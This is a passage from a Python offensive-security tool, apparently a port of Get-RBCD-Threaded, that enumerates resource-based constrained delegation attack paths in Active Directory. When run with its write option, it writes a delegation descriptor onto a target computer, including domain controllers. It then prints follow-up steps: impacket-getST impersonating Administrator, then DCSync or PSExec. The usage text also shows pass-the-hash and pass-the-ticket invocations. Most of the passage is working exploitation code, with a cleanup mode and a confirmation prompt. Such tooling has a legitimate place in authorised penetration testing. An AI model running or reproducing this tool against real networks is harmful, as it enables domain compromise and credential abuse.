        cprint(f"[*] Using NTLM auth as {ntlm_user} for RBCD write", Colors.YELLOW)
        conn = Connection(server, user=ntlm_user, password=args.password, authentication=NTLM, receive_timeout=60)
    else:
        cprint("[!] No valid auth method for write operation", Colors.RED)
        return False

    if not conn.bind():
        cprint(f"[!] Bind failed: {conn.result}", Colors.RED)
        return False
    cprint(f"[+] Bind successful", Colors.GREEN)

    delegate_sid = resolve_sid(conn, base_dn, args.delegate_from, args.domain)
    if not delegate_sid:
        conn.unbind()
        return False
    cprint(f"[+] Delegate-from SID: {delegate_sid}", Colors.GREEN)

    target_dn = resolve_target_dn(conn, base_dn, args.target)
    if not target_dn:
        conn.unbind()
        return False
    cprint(f"[+] Target DN: {target_dn}", Colors.GREEN)

    sd_bytes = build_rbcd_sd(delegate_sid)
    cprint(f"[*] Built security descriptor ({len(sd_bytes)} bytes)", Colors.CYAN)
    cprint(f"[*] Writing msDS-AllowedToActOnBehalfOfOtherIdentity...", Colors.YELLOW)

    result = conn.modify(target_dn,
        {'msDS-AllowedToActOnBehalfOfOtherIdentity': [(ldap3.MODIFY_REPLACE, [sd_bytes])]})

    if result:
        cprint(f"[+] SUCCESS! RBCD delegation configured.", Colors.GREEN)
        target_hostname = None
        conn.search(base_dn, f"(distinguishedName={escape_filter_chars(target_dn)})",
                    attributes=["dNSHostName", "sAMAccountName"], search_scope=ldap3.SUBTREE)
        if conn.entries:
            target_hostname = str(conn.entries[0]["dNSHostName"].value or "")
            if not target_hostname:
                sam = str(conn.entries[0]["sAMAccountName"].value or "")
                target_hostname = sam.rstrip("$") + "." + args.domain
        if not target_hostname:
            cn_match = re.match(r'CN=([^,]+)', target_dn, re.IGNORECASE)
            target_hostname = (cn_match.group(1) + "." + args.domain) if cn_match else args.target

        cprint(f"\n[*] Next steps:", Colors.CYAN)
        cprint(f"  1. impacket-getST '{args.domain}/{args.delegate_from}:<PASSWORD>' \\", Colors.CYAN)
        cprint(f"       -spn cifs/{target_hostname} -impersonate Administrator -dc-ip {dc_host}", Colors.CYAN)
        cprint(f"  2. export KRB5CCNAME=Administrator@cifs_{target_hostname}@{args.domain.upper()}.ccache", Colors.CYAN)
        cprint(f"  3. DCSync or PSExec with the ticket", Colors.CYAN)
        cprint(f"\n[!] REMEMBER to clean up with --clear-rbcd when done!", Colors.RED)
    else:
        cprint(f"[!] FAILED to write RBCD: {conn.result}", Colors.RED)

    conn.unbind()
    return result


def clear_rbcd(args, base_dn):
    cprint(f"\n{'='*70}", Colors.MAGENTA)
    cprint("[*] RBCD CLEANUP MODE - Removing delegation", Colors.MAGENTA)
    cprint(f"{'='*70}\n", Colors.MAGENTA)

    dc_host = args.dc_ip or args.domain
    use_ssl = not args.insecure
    port    = 636 if use_ssl else 389
    server  = Server(dc_host, port=port, use_ssl=use_ssl, get_info=NONE, connect_timeout=30)

    if args.anonymous or (not args.username and not args.password):
        conn = Connection(server, authentication=ANONYMOUS, receive_timeout=60)
    elif args.username and args.password:
        ntlm_user = args.username if "\\" in args.username else f"{args.domain}\\{args.username}"
        conn = Connection(server, user=ntlm_user, password=args.password, authentication=NTLM, receive_timeout=60)
    else:
        cprint("[!] No valid auth method for cleanup", Colors.RED)
        return False

    if not conn.bind():
        cprint(f"[!] Bind failed: {conn.result}", Colors.RED)
        return False
    cprint(f"[+] Bind successful", Colors.GREEN)

    target_dn = resolve_target_dn(conn, base_dn, args.target)
    if not target_dn:
        conn.unbind()
        return False
    cprint(f"[+] Target DN: {target_dn}", Colors.GREEN)

    result = conn.modify(target_dn,
        {'msDS-AllowedToActOnBehalfOfOtherIdentity': [(ldap3.MODIFY_REPLACE, [])]})

    if result:
        cprint(f"[+] SUCCESS! RBCD delegation removed from {args.target}", Colors.GREEN)
    else:
        cprint(f"[!] FAILED to clear RBCD: {conn.result}", Colors.RED)

    conn.unbind()
    return result


# =============================================================================
# Output Functions
# =============================================================================

def print_results(rbcd_results: list):
    cprint(f"\n{'='*70}", Colors.GREEN)
    cprint(f"[+] Found {len(rbcd_results)} possible RBCD attack paths", Colors.GREEN)
    cprint(f"{'='*70}\n", Colors.GREEN)

    dc_results      = [r for r in rbcd_results if r.is_dc]
    regular_results = [r for r in rbcd_results if not r.is_dc]

    if dc_results:
        cprint(f"[!!!] {len(dc_results)} paths target DOMAIN CONTROLLERS:", Colors.RED)
        cprint(f"{'-'*70}", Colors.RED)
        for r in dc_results:
            # Groups highlighted in yellow to draw attention
            name_color = Colors.YELLOW if r.source_type == "Group" else Colors.RED
            cprint(f"  Source:      {r.source} [{r.source_type}] ({r.source_sid})", name_color)
            cprint(f"  Domain:      {r.source_domain}", Colors.RED)
            cprint(f"  Destination: {r.destination} [DC]", Colors.RED)
            cprint(f"  DN:          {r.destination_dn}", Colors.RED)
            cprint(f"  Privilege:   {r.privilege}", Colors.RED)
            cprint(f"  {'-'*60}", Colors.RED)
        print()

    if regular_results:
        cprint(f"[+] {len(regular_results)} paths on regular computer objects:", Colors.CYAN)
        cprint(f"{'-'*70}", Colors.CYAN)
        for r in regular_results:
            name_color = Colors.YELLOW if r.source_type == "Group" else Colors.CYAN
            cprint(f"  Source:      {r.source} [{r.source_type}]", name_color)
            cprint(f"  Domain:      {r.source_domain}", Colors.CYAN)
            cprint(f"  Destination: {r.destination}", Colors.CYAN)
            cprint(f"  Privilege:   {r.privilege}", Colors.CYAN)
            cprint(f"  {'-'*60}", Colors.CYAN)


def export_csv(rbcd_results: list, filepath: str):
    try:
        with open(filepath, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=[
                "source", "source_sid", "source_domain", "source_type",
                "destination", "destination_dn", "privilege", "is_dc"
            ])
            writer.writeheader()
            for r in rbcd_results:
                writer.writerow(asdict(r))
        cprint(f"[+] Results saved to {filepath}", Colors.GREEN)
        return True
    except Exception as e:
        cprint(f"[!] Failed to save CSV: {e}", Colors.RED)
        return False


def export_json(rbcd_results: list, filepath: str):
    try:
        with open(filepath, 'w') as f:
            json.dump([asdict(r) for r in rbcd_results], f, indent=2)
        cprint(f"[+] Results saved to {filepath}", Colors.GREEN)
        return True
    except Exception as e:
        cprint(f"[!] Failed to save JSON: {e}", Colors.RED)
        return False


# =============================================================================
# Main
# =============================================================================

def banner():
    print(f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ██████╗ ██████╗  ██████╗██████╗     ██████╗ ██╗   ██╗      ║
║   ██╔══██╗██╔══██╗██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝      ║
║   ██████╔╝██████╔╝██║     ██║  ██║    ██████╔╝ ╚████╔╝       ║
║   ██╔══██╗██╔══██╗██║     ██║  ██║    ██╔═══╝   ╚██╔╝        ║
║   ██║  ██║██████╔╝╚██████╗██████╔╝    ██║        ██║         ║
║   ╚═╝  ╚═╝╚═════╝  ╚═════╝╚═════╝     ╚═╝        ╚═╝         ║
║                                                              ║
║  Resource-Based Constrained Delegation Enumerator            ║
║  Python port of Get-RBCD-Threaded by FatRodzianko            ║
║  Enumerate | Exploit | Cleanup                               ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
""")


def main():
    banner()

    parser = argparse.ArgumentParser(
        description="Discover and exploit RBCD attack paths in Active Directory",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # NTLM password
  %(prog)s -d corp.local -u admin -p 'Password123' --dc-ip 10.10.10.1 -i

  # Pass-the-hash (:NT format)
  %(prog)s -d corp.local -u admin --hashes :fc525c9683e8fe067095ba2ddc971889 --dc-ip 10.10.10.1 -i

  # AES-256 key (requires impacket)
  %(prog)s -d corp.local -u admin --aes-key a4e2... --dc-ip 10.10.10.1 -i

  # Existing ccache / pass-the-ticket
  %(prog)s -d corp.local --ccache /tmp/admin.ccache --dc-ip 10.10.10.1 -i

  # Anonymous scan
  %(prog)s -d corp.local --dc-ip 10.10.10.1 --anonymous -i

  # Write RBCD delegation (pass-the-hash)
  %(prog)s -d corp.local -u admin --hashes :fc525c... --dc-ip 10.10.10.1 -i \\
      --write-rbcd --target DC01 --delegate-from CODY_ROY

  # Cleanup
  %(prog)s -d corp.local -u admin -p pass --dc-ip 10.10.10.1 -i \\
      --clear-rbcd --target DC01
        """
    )

    parser.add_argument("-d", "--domain", required=True, help="Target domain FQDN (e.g. corp.local)")
    parser.add_argument("-u", "--username", help="Username to authenticate as")
    parser.add_argument("-p", "--password", help="Password")
    parser.add_argument("--hashes", metavar="LM:NT",
                        help="Pass-the-hash: LM:NT or just :NT (e.g. :fc525c9683e8fe067095ba2ddc971889)")
    parser.add_argument("--aes-key", metavar="HEXKEY",
                        help="Kerberos AES-128 or AES-256 key (hex). Requires impacket.")
    parser.add_argument("--use-aes", action="store_true",
                        help="Derive AES-256 key from -p password and use Kerberos (requires impacket)")
    parser.add_argument("--ccache", metavar="FILE",
                        help="Path to Kerberos ccache file (or set KRB5CCNAME env var)")
    parser.add_argument("--dc-ip", help="IP address of the Domain Controller (for TCP routing)")
    parser.add_argument("--dc-host", metavar="FQDN",
                        help="DC hostname/FQDN for Kerberos SPN resolution (e.g. IT-DC01.it.gcb.local). "
                             "Required when using --use-aes/--aes-key/--ccache with --dc-ip. "
                             "Add to /etc/hosts if not DNS-resolvable.")
    parser.add_argument("-o", "--output", help="Output results to CSV file")
    parser.add_argument("--json", dest="json_output", help="Output results to JSON file")
    parser.add_argument("-i", "--insecure", action="store_true",
                        help="Use plaintext LDAP (port 389) instead of LDAPS (port 636)")
    parser.add_argument("--pwdlastset", type=int, default=0,
                        help="Filter out computers with pwdLastSet older than N days")
    parser.add_argument("--anonymous", action="store_true", help="Use anonymous LDAP bind")
    parser.add_argument("--anon-only", action="store_true",
                        help="Only check anonymous/guest write access (skip authenticated scan)")
    parser.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos authentication")
    parser.add_argument("--threads", type=int, default=10,
                        help="Number of threads for ACL processing (default: 10)")
    parser.add_argument("--no-anon-check", action="store_true",
                        help="Skip the bonus anonymous access check")
    parser.add_argument("--no-color", action="store_true", help="Disable colored output")

    rbcd_group = parser.add_argument_group("RBCD Write/Clear (use with caution)")
    rbcd_group.add_argument("--write-rbcd", action="store_true",
                            help="Write msDS-AllowedToActOnBehalfOfOtherIdentity on target (EXPLOITATION)")
    rbcd_group.add_argument("--clear-rbcd", action="store_true",
                            help="Clear msDS-AllowedToActOnBehalfOfOtherIdentity on target (CLEANUP)")
    rbcd_group.add_argument("--target", help="Target computer: DN, sAMAccountName, or dNSHostName")
    rbcd_group.add_argument("--delegate-from",
                            help="Principal to delegate from: sAMAccountName or SID (required for --write-rbcd)")

    args = parser.parse_args()

    if args.no_color:
        for attr in dir(Colors):
            if not attr.startswith('_'):
                setattr(Colors, attr, "")

    start_time = time.time()
    base_dn = ",".join([f"DC={part}" for part in args.domain.split(".")])

    if args.write_rbcd:
        if not args.target:
            cprint("[!] --write-rbcd requires --target", Colors.RED); sys.exit(1)
        if not args.delegate_from:
            cprint("[!] --write-rbcd requires --delegate-from", Colors.RED); sys.exit(1)
        cprint(f"\n{Colors.RED}{'!'*70}", Colors.RED)
        cprint(f"  WARNING: You are about to MODIFY an Active Directory object.", Colors.RED)
        cprint(f"  Target:        {args.target}", Colors.RED)
        cprint(f"  Delegate-from: {args.delegate_from}", Colors.RED)
        cprint(f"{'!'*70}{Colors.RESET}\n", Colors.RED)
        confirm = input(f"{Colors.RED}Type 'YOUREALLYREALLYSURE' to confirm: {Colors.RESET}")
        if confirm.strip() != "YOUREALLYREALLYSURE":
            cprint("[*] Aborted.", Colors.YELLOW); sys.exit(0)
        success = write_rbcd(args, base_dn)
        cprint(f"\n[*] Execution time: {time.time() - start_time:.2f} seconds", Colors.BLUE)
        sys.exit(0 if success else 1)

    if args.clear_rbcd:
        if not args.target:
            cprint("[!] --clear-rbcd requires --target", Colors.RED); sys.exit(1)
        cprint(f"\n{Colors.MAGENTA}{'!'*70}", Colors.MAGENTA)
        cprint(f"  Clearing RBCD delegation on: {args.target}", Colors.MAGENTA)
        cprint(f"{'!'*70}{Colors.RESET}\n", Colors.MAGENTA)
        confirm = input(f"{Colors.MAGENTA}Type 'YES' to confirm cleanup: {Colors.RESET}")
        if confirm.strip() != "YES":
            cprint("[*] Aborted.", Colors.YELLOW); sys.exit(0)
        success = clear_rbcd(args, base_dn)
        cprint(f"\n[*] Execution time: {time.time() - start_time:.2f} seconds", Colors.BLUE)
        sys.exit(0 if success else 1)

    if args.anon_only:
        all_results = check_anonymous_rbcd(args, base_dn)
    else:
        try:
            conn, base_dn = create_connection(args)
        except Exception as e:
            cprint(f"[!] Failed to connect: {e}", Colors.RED); sys.exit(1)

        cprint(f"\n{'='*70}", Colors.BLUE)
        cprint("[*] Phase 1: Enumerating domain objects...", Colors.BLUE)
        cprint(f"{'='*70}", Colors.BLUE)

        all_sids, all_sid_maps = [], []
        for sids, maps in [
            get_users(conn, base_dn, args.domain),
            get_groups(conn, base_dn, args.domain),
        ]:
            all_sids.extend(sids)
            all_sid_maps.extend(maps)

        computer_sids, computer_maps, computer_entries = get_computers(
            conn, base_dn, args.domain, args.pwdlastset)
        all_sids.extend(computer_sids)
        all_sid_maps.extend(computer_maps)

        all_sids_set  = set(all_sids)
        sid_map_dict  = {m.object_sid: m for m in all_sid_maps}
        cprint(f"\n[+] Total enumerated SIDs: {len(all_sids)}", Colors.GREEN)

        cprint(f"\n{'='*70}", Colors.BLUE)
        cprint(f"[*] Phase 2: Analyzing DACLs on {len(computer_entries)} computer objects...", Colors.BLUE)
        cprint(f"{'='*70}", Colors.BLUE)

        rbcd_results = []
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {
                executor.submit(check_rbcd_aces, entry, all_sids_set, sid_map_dict): entry
                for entry in computer_entries
            }
            completed = 0
            for future in as_completed(futures):
                completed += 1
                if completed % 100 == 0 or completed == len(computer_entries):
                    print(f"\r[*] Processed {completed}/{len(computer_entries)} computer objects...",
                          end="", flush=True)
                try:
                    rbcd_results.extend(future.result())
                except Exception as e:
                    cprint(f"\n[!] Error processing entry: {e}", Colors.RED)
        print()

        try:
            _tmp = getattr(conn, '_tmp_ccache', None)
            conn.unbind()
            if _tmp and os.path.isfile(_tmp):
                os.unlink(_tmp)
                cprint(f"[*] Cleaned up temp ccache {_tmp}", Colors.CYAN)
        except Exception:
            pass

        all_results = rbcd_results
        if not args.no_anon_check:
            all_results = rbcd_results + check_anonymous_rbcd(args, base_dn)

    if all_results:
        print_results(all_results)
        if args.output:
            export_csv(all_results, args.output)
        if args.json_output:
            export_json(all_results, args.json_output)
    else:
        cprint("\n[-] No RBCD attack paths found.", Colors.YELLOW)

    cprint(f"\n[*] Execution time: {time.time() - start_time:.2f} seconds", Colors.BLUE)


if __name__ == "__main__":
    main()
